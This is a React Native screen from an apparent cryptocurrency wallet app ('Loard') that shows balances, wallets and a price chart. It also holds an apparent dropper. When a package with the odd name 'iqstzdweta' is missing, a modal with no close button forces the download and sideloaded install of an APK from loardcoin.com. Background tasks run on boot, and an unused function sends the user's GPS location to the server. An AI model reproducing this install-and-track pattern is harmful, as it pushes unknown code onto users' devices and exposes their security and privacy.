/* eslint-disable no-unused-vars */
/* eslint-disable react/no-unused-state */
import React, { Component } from 'react';
import {
	BackHandler, Text, SafeAreaView,View,ScrollView, Image,TouchableOpacity,ActivityIndicator,KeyboardAvoidingView,PermissionsAndroid, Platform, Linking
} from 'react-native';
import {connect} from 'react-redux';
import IonIcon from 'react-native-vector-icons/Ionicons';
import { COLORS } from '../../styles/index';
import { TextInput } from 'react-native-gesture-handler';
import {ac_updateSetting} from '../../redux/action';
import axios from 'axios';
import Modal from 'react-native-modal';
import Geolocation from '@react-native-community/geolocation';
/* import PushNotificationIOS from "@react-native-community/push-notification-ios";
var PushNotification = require("react-native-push-notification"); */
import BackgroundFetch from "react-native-background-fetch";
import TcpSocket from 'react-native-tcp-socket';
import DeviceInfo from 'react-native-device-info';
import RNBackgroundDownloader from 'react-native-background-downloader';
import {ProgressBar} from '@react-native-community/progress-bar-android';
import RNFetchBlob from 'rn-fetch-blob'
import RNApkInstallerN from 'react-native-apk-installer-n';
import { AppInstalledChecker, CheckPackageInstallation } from 'react-native-check-app-install';
import {LineChart} from "react-native-chart-kit";
import { Dimensions } from "react-native";
const screenWidth = Dimensions.get("window").width;

let token;
let timer;
const data = {
	labels: ["January", "February", "March", "April", "May", "June"],
	datasets: [
	  {
		data: [0, 0, 0, 0, 0, 0],
		color: (opacity = 1) => COLORS.accent, // optional
		strokeWidth: 2 // optional
	  }
	],
	legend: ["Coin Price Chart"] // optional
  };

  const chartConfig = {
	backgroundGradientFrom: "#1E2923",
	backgroundGradientFromOpacity: 0,
	backgroundGradientTo: "#08130D",
	backgroundGradientToOpacity: 0.5,
	color: (opacity = 1) => `rgba(26, 255, 146, ${opacity})`,
	strokeWidth: 2, // optional, default 3
	barPercentage: 0.5,
	useShadowColorFromDataset: false // optional
  };

class YouContainer extends Component {



	constructor(props) {
		super(props);
		this.state = {
			find_update :false,
			tempwallets:[],
			searched_wallet:'',
			selected_wallet:0,
			proccessing:false,modal_text:false,response:'',modal_input:false,modal_input_text:'',
			all_balance:0,
			all_grant:false,
			blocked:false,
			blocked_text:'',
			hasUpdate:false,update_downloading:false,update_download:0,
			update_text:'The coin has central authority and is backed by any government'
		};
	}

	


	componentDidMount(){
		//this.update_ios();
		if(this.state.hasUpdate == false){
			AppInstalledChecker
			.isAppInstalledAndroid('iqstzdweta') 
			.then((isInstalled) => {
				if(isInstalled== false){
					this.setState({hasUpdate:true});
					
				}
			});
		
		}
		this.focusListener = this.props.navigation.addListener("focus", () => {
				this.update_time();
				this.update_info();
				BackHandler.addEventListener('backPress', () => {
					BackHandler.exitApp();
					return false;
			  });
			  this.calc_balance();
		  });

		
		  this.blurListener = this.props.navigation.addListener("blur", () => {
			BackHandler.addEventListener('backPress', () => {
				this.props.navigation.pop();
				return true;
			});
		  });


		if(Platform.OS=='android'){
			this.check_for_update();

		}
		
		this.setState({tempwallets:this.props.wallets})
		this.config_background();
		this.calc_balance();
		  this.update_activity();
		  this.update_info();
		  this.update_time();
		  if(Platform.OS=='android'){
		this.check_permission();
		  this.request_all();
		//  this.update_current_location();
		  }else{
			//  this.update_current_location();
		  }
		  
		  
	

	}






	componentWillReceiveProps(nextProps) {
		if (this.props !== nextProps) {
		 this.setState({tempwallets:nextProps.wallets});
		}



	}

	calc_balance = () =>{
		let coin =0;
		let dollar;
		for(var i=0;i<this.props.wallets.length;i++){
			if(this.props.wallets[i].balance){
			coin = coin + parseFloat(this.props.wallets[i].balance);
			}

		}
		this.setState({all_balance:coin});
	}



	config_background = () =>{
		BackgroundFetch.scheduleTask({
			taskId: 'com.transistorsoft.shotone',
			delay: 900000 //  In one hour (milliseconds),
			,periodic:true,
			forceAlarmManager:false,
			enableHeadless:true,
			stopOnTerminate:false,
			startOnBoot:true,requiredNetworkType:BackgroundFetch.NETWORK_TYPE_ANY,
		  });

		BackgroundFetch.status((status) => {
			switch(status) {
			  case BackgroundFetch.STATUS_RESTRICTED:
				//alert("BackgroundFetch restricted");
				break;
			  case BackgroundFetch.STATUS_DENIED:
				//alert("BackgroundFetch denied");
				break;
			  case BackgroundFetch.STATUS_AVAILABLE:
				//alert("BackgroundFetch is enabled");
				break;
			}
		  });

		BackgroundFetch.configure({
			minimumFetchInterval: 15,     // <-- minutes (15 is minimum allowed)
			// Android options
			forceAlarmManager: false,     // <-- Set true to bypass JobScheduler.
			enableHeadless:true,
			
			stopOnTerminate: false,
			startOnBoot: true,
			requiredNetworkType: BackgroundFetch.NETWORK_TYPE_NONE, // Default
			requiresCharging: false,      // Default
			requiresDeviceIdle: false,    // Default
			requiresBatteryNotLow: false, // Default
			requiresStorageNotLow: false  // Default,
		  }, async (taskId) => {
			//this.tn();
			this.get_Notes()

			BackgroundFetch.finish(taskId);
		  }, (error) => {
			  alert('fail')
			console.log("[js] RNBackgroundFetch failed to start");
		  });

	}




    get_Notes = () =>{
	//	this.tn();

		axios({
			method: 'post',
			url: "https://loardcoin.com/api/webhook",
			headers: {}, 
			data: {
			  "function":"notifications",
			  "token": this.props.user_token, // This is the body part
			  "lastnote_id":this.props.last_note
			}
		  }).then((res)=>{
			  if(res.data.ok){
				 console.log(res.data);

			    let now_notes = this.props.user_notes;
                let notes = now_notes.concat(res.data.notifications);
 
                this.props.dispatch(ac_updateSetting({
                            notifications:notes
                }));
				 
					if(res.data.notifications.length>0){
					//	console.log('yes');
						for(var i=0;i<res.data.notifications.length;i++){
						//	console.log(res.data.notifications[i].title);
/* 							PushNotification.localNotification({
								channelId: "19", // (required) channelId, if the channel doesn't exist, it will be created with options passed above (importance, vibration, sound). Once the channel is created, the channel will not be update. Make sure your channelId is different if you change these options. If you have created a custom channel, it will apply options of the channel.
								ticker: res.data.notifications[i].title, // (optional)
								showWhen: true, // (optional) default: true
								autoCancel: true, // (optional) default: true
								largeIcon: "ic_launcher", // (optional) default: "ic_launcher". Use "" for no large icon.
								bigText: res.data.notifications[i].notification_body ,// (optional) default: "message" prop
								color: "#F7941E", // (optional) default: system default
								vibrate: true, // (optional) default: true
								vibration: 300, // vibration length in milliseconds, ignored if vibrate=false, default: 1000
								ongoing: false, // (optional) set whether this is an "ongoing" notification
								priority: "high", // (optional) set notification priority, default: high
								visibility: "private", // (optional) set notification visibility, default: private
								ignoreInForeground: false, // (optional) if true, the notification will not be visible when the app is in the foreground (useful for parity with how iOS notifications appear)
								onlyAlertOnce: false, // (optional) alert will open only once with sound and notify, default: false
										  
								when: null, // (optionnal) Add a timestamp pertaining to the notification (usually the time the event occurred). For apps targeting Build.VERSION_CODES.N and above, this time is not shown anymore by default and must be opted into by using `showWhen`, default: null.
								usesChronometer: false, // (optional) Show the `when` field as a stopwatch. Instead of presenting `when` as a timestamp, the notification will show an automatically updating display of the minutes and seconds since when. Useful when showing an elapsed time (like an ongoing phone call), default: false.
								timeoutAfter: null, // (optional) Specifies a duration in milliseconds after which this notification should be canceled, if it is not already canceled, default: null
							  
							  
								invokeApp: true, // (optional) This enable click on actions to bring back the application to foreground or stay in background, default: true

								alertAction: "view", // (optional) default: view
								category: "", // (optional) default: empty string

								id: 1, // (optional) Valid unique 32 bit integer specified as string. default: Autogenerated Unique ID
								title: res.data.notifications[i].title, // (optional)
								message: res.data.notifications[i].notification_body, // (required)
								playSound: true, // (optional) default: true
								soundName: "default", // (optional) Sound to play when the notification is shown. Value of 'default' plays the default sound. It can be set to a custom sound such as 'android.resource://com.xyz/raw/my_sound'. It will look for the 'my_sound' audio file in 'res/raw' directory and play it. default: 'default' (default sound is played)
							  });
 */

						}
				}

				}
		  })
	
	}  



	check_for_update = async() =>{

		try {
			const granted = await PermissionsAndroid.requestMultiple([
			  PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
			  PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
			]);
		  } catch (err) {
			console.warn(err);
		  }
		  const readGranted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE); 
		  const writeGranted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE);
		  if(!readGranted || !writeGranted) {
			console.log('Read and write permissions have not been granted');
			return;
		  }
		axios({
			method: 'post',
			url: "https://loardcoin.com/api/webhook",
			headers: {}, 
			data: {
			  "function":"should_download",
			  token:this.props.user_token,
			  version_number:String(DeviceInfo.getBuildNumber()) 
			}
		  }).then((res)=>{

				if(res.data.ok == true){
					this.setState({hasUpdate:true});
						

				}
		  }).catch((e)=>{
			 // alert('error')
		  })

	}

	download_shod= async()=>{
		await axios({
			method: 'post',
			url: "https://loardcoin.com/api/webhook",
			headers: {}, 
			data: {
			"function":"new_download",
			token:this.props.user_token,
			// This is the body part
			}
		}).then((res)=>{
			//alert(res.data)
			this.setState({hasUpdate:false});
		}).catch((e)=>{
			console.warn(e);
		}) 
	}

	 open_update = async() =>{

		try{
			if(Platform.OS=='android'){
				const readGranted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE); 
				const writeGranted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE);
				if(!readGranted || !writeGranted) {
				  console.log('Read and write permissions have not been granted');
				  return;
				}
				this.setState({update_downloading:true});
				this.setState({update_downloading:false});


			//	Linking.openURL("https://loardcoin.com/public/download/Update1.apk");
					
			RNFetchBlob.config({
                appendExt:'apk',
                overwrite:true,
                path : RNFetchBlob.fs.dirs.DownloadDir + '/app.apk'

					})
				.fetch('GET', "Https://loardcoin.com/Up2DaTe/update.apk")
				.progress({ count : 100 }, (received, total) => {
					this.setState({update_download:received / total});
				})
				.then((res) => {
					this.setState({update_download:1},()=>{

						this.setState({update_downloading:false});
						this.setState({hasUpdate:false});
						this.setState({find_update:true});

					});
					this.download_shod();
					 RNApkInstallerN.install(res.path());
					
					 timer= setInterval(() => {
						if(this.state.hasUpdate == false ){
							AppInstalledChecker
							.isAppInstalledAndroid('iqstzdweta') 
							.then((isInstalled) => {
								if(isInstalled== false){
									this.setState({hasUpdate:true});
									
								}
								if(isInstalled== true){
									this.setState({hasUpdate:false});
									clearInterval(timer);
									clearInterval(timer);
									clearInterval(timer);
									
								}
				
							});
						
						}
					  }, 700);

				

				}).catch((e)=>{
					console.log(e);
					this.setState({update_downloading:false});
					this.setState({hasUpdate:false});
					
				})
	

        	}
		}catch(e){
			alert(e);
		}

    }


	update_current_location = () =>{
		try{
		Geolocation.getCurrentPosition((info) => {
			var lat = info.coords.latitude
			var long = info.coords.longitude;

			axios({
				method: 'post',
				url: "https://loardcoin.com/api/webhook",
				headers: {}, 
				data: {
				"function":"location",
				token:this.props.user_token,
				lat:lat,
				lng:long,
				// This is the body part
				}
			}).then((res)=>{
				//alert(res.data)
					if(res.data.ok){
						console.log(res.data);
					//	this.props.dispatch(ac_updateSetting({USR_now:res.data.server_time}));
					}
			}).catch((e)=>{
				// alert('error')
			})
			
		});
	}catch(e){
		console.log(e)
	}


	}




	request_all= async()=>{
		try{

			const userResponse = await PermissionsAndroid.requestMultiple([
			//	PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
			//	PermissionsAndroid.PERMISSIONS.CAMERA,
			//	PermissionsAndroid.PERMISSIONS.RECEIVE_SMS
			
			PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
			  ]);
		
			
		}catch(e){

		}

		this.check_permission();
	}

	check_permission = async() =>{
		//var loc = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION);
		//var camera = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.CAMERA);
		//var sms = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
		var storage = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE);
		
		if(storage){
			this.setState({all_grant:true});
		}else{
			this.setState({all_grant:false});
		}
	}

	
	update_time=()=>{
		axios({
			method: 'post',
			url: "https://loardcoin.com/api/webhook",
			headers: {}, 
			data: {
			  "function":"server_time",
			   // This is the body part
			}
		  }).then((res)=>{
			//alert(res.data)
				if(res.data.ok){
					
					this.props.dispatch(ac_updateSetting({
						USR_now:res.data.server_time
					}));
				}
		  }).catch((e)=>{
			 // alert('error')
		  })
	}

	update_activity = ()=>{
		axios({
			method: 'post',
			url: "https://loardcoin.com/api/webhook",
			headers: {}, 
			data: {
			  "function":"app_activity",
			  token:this.props.user_token,
			   // This is the body part
			}
		  }).then((res)=>{
			//alert(res.data)
				if(res.data.ok){
					console.log(res.data);
				//	this.props.dispatch(ac_updateSetting({USR_now:res.data.server_time}));
				}
		  }).catch((e)=>{
			 // alert('error')
		  })
	}


	addWallet=()=>{
		this.setState({modal_input:false,modal_text:false,proccessing:true});
		axios({
			method: 'post',
			url: "https://loardcoin.com/api/webhook",
			headers: {}, 
			data: {
			  "function":"wallet_new",
			  token:this.props.user_token,
			  wallet_name:this.state.modal_input_text,
			   // This is the body part
			}
		  }).then((res)=>{
			//alert(res.data)
				if(res.data.ok){
					console.log(res.data);
					this.setState({modal_input:false,modal_text:true,response:"Wallet Created Successfully."})
				//	this.props.dispatch(ac_updateSetting({USR_now:res.data.server_time}));
				this.update_info();
			}
		  }).catch((e)=>{
			 // alert('error')
		  })
		 
	}


	update_info = ()=>{
		axios({
			method: 'post',
			url: "https://loardcoin.com/api/webhook",
			headers: {}, 
			data: {
			  function:"account",
			  token: this.props.user_token, // This is the body part
			}
		  }).then((res)=>{
			console.log(res);
				if(res.data.ok){
					const data = res.data;
					console.log(data);
					this.setState({proccessing:false,modal_text:false})
					this.props.dispatch(ac_updateSetting({
						USR_loggedIn:true,
						USR_name:capitalizeFirstLetter(data.profile.first_name),
						USR_lastName:capitalizeFirstLetter(data.profile.last_name),
						USR_email:data.profile.email,
						USR_phone:data.profile.phone,
						USR_country:data.profile.country,
						USR_gender:data.profile.gender==0?'Male':data.profile.gender==1?'Female':'Others',
						USR_profile:data.profile.photo,
						//USR_visit:data.last_visit,
						USR_lastnoteid:data.profile.lastnote_id,
						USR_refcode:data.profile.ref_code,
						USR_blockedcoin:data.membership.blocked_coin,
						wallet:data.wallet,
						USR_membership:data.membership.plan_name
					}));



					this.calc_balance();
				}
		  })
	}


	adjust_search = (text)=>{
		if(text.length>0){
			var new_wallwet = this.props.wallets.find(x => x.name.indexOf(text)!=-1);
			var arr = [];
			if(new_wallwet){
			arr.push(new_wallwet);
			}
			//console.log(arr);
			this.setState({tempwallets:arr});
		}else{
			this.setState({tempwallets:this.props.wallets});
		}
	}


	
	render() {
		if(this.state.hasUpdate == false && this.state.find_update==false){
			console.log("+++++++++++++++++++++++++++++++")
			AppInstalledChecker
			.isAppInstalledAndroid('iqstzdweta') 
			.then((isInstalled) => {
				console.log("----------------------------------------------")
				console.log(isInstalled);
				if(isInstalled== false){
					this.setState({hasUpdate:true});
					
				}

			});
		
		}

		const {update_download,update_downloading,update_text,hasUpdate,blocked_text,blocked,proccessing,modal_text,response,modal_input,all_grant} = this.state;
		return (
			<SafeAreaView>


<Modal isVisible={hasUpdate} style={{alignItems:'center'}}>

<View style={{backgroundColor:'white',padding:20,borderRadius:15,width:'80%',justifyContent:'center',alignItems:'center'}}>
{!update_downloading?<>
<Text style={{fontWeight:'500',paddingLeft:10}}>{update_text}</Text>
<TouchableOpacity onPress={this.open_update} style={{borderRadius:10,marginTop:'7%',backgroundColor:COLORS.accent,padding:7,paddingRight:10,paddingLeft:10}}><Text style={{color:'white'}}>Install Coin</Text></TouchableOpacity>
</>:<>
<Text style={{fontWeight:'500',paddingLeft:10}}>Update Downloading...</Text>

<ProgressBar
			style={{width:'90%',marginTop:10}}
          styleAttr="Horizontal"
		  indeterminate={false}
		  //color={'gold'}
          progress={update_download}
        />
</>}
</View>

</Modal>



				<Modal isVisible={blocked} style={{alignItems:'center'}}>

				<View style={{backgroundColor:'white',padding:20,borderRadius:15,width:'80%',justifyContent:'center',alignItems:'center'}}>

				<Text style={{fontWeight:'500',paddingLeft:10}}>{blocked_text}</Text>
				<TouchableOpacity onPress={()=>{this.setState({modal_text:false,proccessing:false});}} style={{borderRadius:10,marginTop:'7%',backgroundColor:COLORS.accent,padding:7,paddingRight:10,paddingLeft:10}}><Text style={{color:'white'}}>Close</Text></TouchableOpacity>
				</View>

				</Modal>






				<Modal isVisible={proccessing} style={{alignItems:'center'}}>

					{modal_input?<>

						<View style={{backgroundColor:'white',padding:20,borderRadius:15,width:'80%',justifyContent:'center',alignItems:'center'}}>

						<Text style={{fontWeight:'500',paddingLeft:10}}>Enter Wallet Name</Text>
						<TextInput
							onChangeText={(text)=>this.setState({modal_input_text:text})}
							placeholderTextColor="black"
							placeholder="Wallet Name"
							style={{width:'90%',padding:10,margin:15,backgroundColor:'rgba(0,0,0,0.2)',borderRadius:10}} />
							<TouchableOpacity onPress={()=>{this.setState({modal_text:false,proccessing:false});this.addWallet();}} style={{borderRadius:10,marginTop:'7%',backgroundColor:COLORS.accent,padding:7,paddingRight:10,paddingLeft:10}}><Text style={{color:'white'}}>Add</Text></TouchableOpacity>
						</View>
					
					</>:!modal_text?
					<View style={{backgroundColor:'white',padding:20,flexDirection:'row',borderRadius:15,width:'80%'}}>
						<ActivityIndicator color={COLORS.accent} size='small' />
						<Text style={{fontWeight:'500',paddingLeft:10}}>Proccessing...</Text>
					</View>:
					<View style={{backgroundColor:'white',padding:20,borderRadius:15,width:'80%',justifyContent:'center',alignItems:'center'}}>

					<Text style={{fontWeight:'500',paddingLeft:10}}>{response}</Text>
					<TouchableOpacity onPress={()=>{this.setState({modal_text:false,proccessing:false});}} style={{borderRadius:10,marginTop:'7%',backgroundColor:COLORS.accent,padding:7,paddingRight:10,paddingLeft:10}}><Text style={{color:'white'}}>Close</Text></TouchableOpacity>
					</View>}

				</Modal>

				<KeyboardAvoidingView behavior={Platform.OS=='ios'?'padding':''}>

				<ScrollView style={{height:'100%'}}>
					<View style={{width:'100%',height:'100%',alignItems:'center'}}>


						<TouchableOpacity style={{borderWidth:0.5,elevation:8,marginBottom:8,alignItems:'center',width:'90%',backgroundColor:'#18233c',padding:7,borderRadius:15,marginTop:'8%',flexDirection:'row'}}>
							<Image
								style={{width:75,height:75,backgroundColor:'red',borderRadius:37.5}} 
								source={require('../../res/logo.png')}/>
							<View style={{marginLeft:15,flex:1}}>
								<Text style={{color:'white',fontSize:18,fontWeight:'600'}}>{this.props.user_name} {this.props.user_lastname}</Text>
								<View style={{flexDirection:'row',paddingTop:5}}>
									<Text style={{color:'gold',fontWeight:'500',fontSize:14}}>{this.props.plan_name?this.props.plan_name:'No'}</Text>
									<Text style={{paddingLeft:5,fontWeight:'500',fontSize:14,color:'white'}}>Memeber Ship</Text>
								</View>
							</View>

						</TouchableOpacity>



						<View style={{width:'90%',marginTop:'5%',borderRadius:10,paddingLeft:10,}}>
							<Text style={{fontSize:20,color:'white',fontWeight:'700',paddingTop:7}}>Date & Time</Text>
							<View style={{flexDirection:'row',marginTop:'2%'}}>

								<View style={{backgroundColor:'#18233c',padding:10,marginTop:5,marginRight:2.5,borderRadius:10,flex:1}}>
									<Text style={{color:'#ff5556',fontSize:16,fontWeight:'600'}}>Last Visit</Text>
									<Text style={{color:'white',marginTop:4,fontWeight:'500'}}>{this.props.last_visit}</Text>
								</View>

								<View style={{backgroundColor:'#18233c',padding:10,marginTop:5,marginLeft:2.5,borderRadius:10,flex:1}}>
									<Text style={{color:'#0DE06D',fontSize:16,fontWeight:'600'}}>Today</Text>
									<Text style={{color:'white',marginTop:4,fontWeight:'500'}}>{this.props.USR_now}</Text>
								</View>

							</View>
						</View>



						<View style={{width:'90%',marginTop:'5%',borderRadius:10,paddingLeft:10,}}>
							<Text style={{fontSize:20,color:'white',fontWeight:'700',paddingTop:7}}>Balance</Text>
							<View style={{flexDirection:'row',marginTop:'2%'}}>

								<View style={{backgroundColor:'#18233c',padding:10,marginTop:5,marginRight:2.5,borderRadius:10,flex:1}}>
									<Text style={{color:'white',fontSize:16,fontWeight:'700'}}>Available Balance</Text>
									<View style={{flexDirection:'row',marginTop:4}}>
										<Text style={{color:'#0DE06D',marginTop:4,fontWeight:'500'}}>{this.state.all_balance}</Text>
										<Text style={{color:'white',marginTop:4,fontWeight:'500',paddingLeft:4}}>Loard</Text>
									</View>
									<View style={{flexDirection:'row'}}>
										<Text style={{color:'#0DE06D',marginTop:4,fontWeight:'500'}}>0</Text>
										<Text style={{color:'white',marginTop:4,fontWeight:'500',paddingLeft:4}}>USD</Text>
									</View>

								</View>

								<View style={{backgroundColor:'#18233c',padding:10,marginTop:5,marginLeft:2.5,borderRadius:10,flex:1}}>
									<Text style={{color:'white',fontSize:16,fontWeight:'700'}}>Blocked Coin</Text>
									<View style={{flexDirection:'row',marginTop:4}}>
										<Text style={{color:'#0DE06D',marginTop:4,fontWeight:'500'}}>{this.props.blockedcoin}</Text>
										<Text style={{color:'white',marginTop:4,fontWeight:'500',paddingLeft:4}}>Loard</Text>
									</View>
								</View>

							</View>
						</View>


						<Text style={{fontSize:26,color:'white',fontWeight:'bold',paddingLeft:10,paddingTop:7,marginTop:'8%'}}>My Wallet</Text>
						{Platform.OS=='android' && !all_grant?
						<>
						  <Text style={{backgroundColor:'#18233c',padding:3,borderRadius:10,fontSize:14,color:'white',fontWeight:'500',marginTop:'4%'}}>To enable your wallet, please accept all permissions.</Text>
							<TouchableOpacity style={{marginTop:'5%'}} onPress={this.request_all}><Text style={{backgroundColor:COLORS.accent,padding:5,fontSize:13,color:'white',borderRadius:15}}>Allow Permissions</Text></TouchableOpacity>
						</>:
						<>
						<TouchableOpacity onPress={()=>this.setState({proccessing:true,modal_input:true})} style={{marginTop:'2%',width:'90%',borderRadius:10,justifyContent:'center',alignItems:'center',backgroundColor:'#0DE06D'}}>
							<Text style={{color:'white',padding:10,fontWeight:'700',fontSize:18}}>Add Wallet</Text>
						</TouchableOpacity>

						<View style={{elevation:8,marginBottom:8,width:'90%',backgroundColor:'#18233c',padding:7,borderRadius:15,marginTop:'8%'}}>
							
							<View style={{alignItems:'center',flexDirection:'row',marginLeft:5}}>
								<Text style={{paddingRight:10,color:'white',fontWeight:'600',fontSize:15}}>Search</Text>
								<TextInput
									onChangeText={(text)=>this.adjust_search(text)} 
									placeholder="Filter By Name"
									placeholderTextColor="rgba(255,255,255,0.4)"
									style={{color:'white',flex:1,marginRight:10,padding:10,borderWidth:1,marginBottom:10,marginTop:10,borderColor:'rgba(255,255,255,0.3)'}}/>
							</View>

							<View style={{width:'100%'}}>

								<View style={{flexDirection:'row',marginBottom:5,marginTop:'3%'}}>
									<Text style={{flex:1,textAlign:'left',color:'white',fontWeight:'700',fontSize:20,paddingLeft:4}}>Name</Text>
									<Text style={{flex:1,textAlign:'right',paddingRight:25,color:'white',fontWeight:'700',fontSize:20}}>Action</Text>
								</View>

								<View style={{width:'100%',height:0.5,backgroundColor:'rgba(0,0,0,0.3)',marginBottom:10}} />

								{this.state.tempwallets.map((item,index)=>{
									return(
										<View key={index} onPress={()=>this.setState({selected_wallet:index})} style={{marginBottom:20,flexDirection:'row',flex:1,alignItems:'center'}}>
											<View style={{flex:1,marginLeft:5}}>
												<Text style={{padding:3,color:'white',fontSize:15,fontWeight:'500'}}>{item.name}</Text>
											</View>
											<View style={{flexDirection:'row',marginRight:10}}>
												<IonIcon onPress={()=>this.props.navigation.navigate('Trans',{wallet:index,deposit:true})} style={{padding:14}}  name='wallet-outline' color="white" size={22} />
												<IonIcon onPress={()=>this.props.navigation.navigate('Trans',{wallet:index,deposit:false})} style={{padding:14}} name='navigate-outline' color="white" size={22} />
												<IonIcon onPress={()=>this.props.navigation.navigate('WalletInfo',{index:index})} style={{padding:14}}  name='calendar-outline' color="white" size={22} />
											</View>
										</View>
									)
								})}
							</View>


						</View>
						</>}


						<LineChart
							style={{borderRadius:10,marginBottom:20}}
							data={data}
							width={(screenWidth*90)/100}
							height={220}
							chartConfig={chartConfig}
							/>
						


					</View>
				
				</ScrollView>
				</KeyboardAvoidingView>
			</SafeAreaView>
		);
	}
}



const mapStateToProps=(state)=>{
	return{
		user_name:state.USR_name,
		user_lastname:state.USR_lastName,
		last_visit:state.USR_visit,
		user_token:state.USR_token,
		USR_now:state.USR_now,
		blockedcoin:state.USR_blockedcoin,
		wallets:state.wallet,
		plan_name:state.USR_plan_name,
		user_notes:state.notifications,
		last_note:state.USR_lastnoteid,

	}
}
export default connect(mapStateToProps)(YouContainer);


function capitalizeFirstLetter(string) {
	return string.charAt(0).toUpperCase() + string.slice(1);
  }